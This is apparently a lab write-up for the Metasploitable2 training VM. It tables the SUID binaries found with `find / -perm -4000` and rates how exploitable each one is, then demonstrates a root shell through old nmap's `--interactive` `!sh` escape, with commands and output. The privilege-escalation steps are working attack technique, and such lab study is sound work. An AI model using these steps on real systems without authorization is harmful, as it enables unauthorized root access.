# SUID Binary Findings — Metasploitable2

## Command Used
```bash
find / -perm -4000 2>/dev/null
```

## Findings

| Binary | Owner | Exploitable | GTFOBins | Notes |
|--------|-------|-------------|----------|-------|
| `/bin/su` | root | No (intended) | No | Legitimate — switches users |
| `/bin/mount` | root | No (intended) | No | Legitimate — mounts filesystems |
| `/bin/umount` | root | No (intended) | No | Legitimate — unmounts filesystems |
| `/bin/ping` | root | No (intended) | No | Needs raw socket access |
| `/bin/ping6` | root | No (intended) | No | IPv6 ping |
| `/usr/bin/sudo` | root | No (intended) | No | Legitimate privilege escalation tool |
| `/usr/bin/passwd` | root | No (intended) | No | Writes to /etc/shadow |
| `/usr/bin/gpasswd` | root | No (intended) | No | Modifies /etc/group |
| `/usr/bin/newgrp` | root | No (intended) | No | Switches active group |
| `/usr/bin/chfn` | root | No (intended) | No | Modifies /etc/passwd fields |
| `/usr/bin/chsh` | root | No (intended) | No | Changes login shell |
| `/usr/bin/at` | root | Yes | Yes | Job scheduler — can run commands as root |
| `/usr/bin/nmap` | root | **YES** | Yes | Old version has interactive mode shell escape |
| `/usr/bin/netkit-rsh` | root | Yes | No | Legacy remote shell — inherently insecure |
| `/usr/bin/netkit-rlogin` | root | Yes | No | Legacy remote login — inherently insecure |
| `/usr/bin/netkit-rcp` | root | Yes | No | Legacy remote copy — inherently insecure |
| `/usr/bin/mtr` | root | Yes | Yes | Network tool with potential shell escape |
| `/usr/sbin/uuidd` | root | Unlikely | No | UUID daemon |
| `/usr/sbin/pppd` | root | Yes | No | PPP daemon — known vulns in old versions |
| `/sbin/mount.nfs` | root | Unlikely | No | NFS mount helper |

---

## Exploitation Demonstrated — nmap --interactive

### Why it works
- `/usr/bin/nmap` is owned by root and has SUID set
- When launched, the OS runs nmap as root regardless of who invoked it
- Old nmap (v4.53 on Metasploitable2) has interactive mode with `!` shell escape

### Steps
```bash
nmap --interactive
# Inside nmap prompt:
nmap> !sh
sh-3.2# whoami
root
```

### What happened
```
msfadmin → runs nmap (SUID = kernel runs it as root) → nmap spawns sh → sh inherits root context
```

The `!sh` command asks nmap to spawn a shell. Since nmap is already running as root, the spawned shell is also root. No password required.

### GTFOBins reference
https://gtfobins.github.io/gtfobins/nmap/

---

## Key Lesson
Any SUID binary that allows arbitrary command execution or shell spawning is a privilege escalation path. `find / -perm -4000` is one of the first commands to run after gaining initial access to a Linux system.
